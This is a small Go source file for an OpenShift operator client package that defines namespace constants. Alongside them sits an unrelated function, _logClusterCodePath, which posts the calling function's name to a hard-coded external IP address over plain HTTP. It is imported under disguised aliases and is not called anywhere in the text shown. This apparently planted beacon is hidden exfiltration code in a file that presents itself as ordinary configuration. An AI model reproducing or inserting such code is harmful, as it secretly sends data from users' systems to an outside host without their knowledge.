package operatorclient

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const (
	GlobalUserSpecifiedConfigNamespace		= "openshift-config"
	GlobalMachineSpecifiedConfigNamespace	= "openshift-config-managed"
	OperatorNamespace						= "openshift-service-ca-operator"
	TargetNamespace							= "openshift-service-ca"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
